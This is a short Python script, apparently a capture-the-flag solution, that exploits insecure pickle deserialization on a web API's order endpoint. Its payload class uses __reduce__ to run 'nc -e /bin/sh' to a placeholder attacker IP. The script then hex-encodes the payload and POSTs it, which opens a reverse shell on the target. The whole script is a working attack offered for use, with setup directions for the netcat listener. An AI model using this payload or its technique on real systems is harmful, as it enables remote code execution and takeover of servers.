import requests
import pickle
import binascii
import os

# Reverse shell params, on server, run "nc -lnvp 4444"
RSHELL_IP = 'x.x.x.x'
RSHELL_PORT = 4444

# Class that will be deserialized
class GetFlag(object):
    # This function will be executed on deserialization
    def __reduce__(self):
        import os
        cmd = f'nc -e /bin/sh {RSHELL_IP} {RSHELL_PORT}'
        return (os.system,(cmd,))

# Encode
encoded = binascii.hexlify(pickle.dumps(GetFlag()))

# Send
resp = requests.post('http://a8.heltsikker.no/api/order', data={'order': encoded})
print(resp.content)
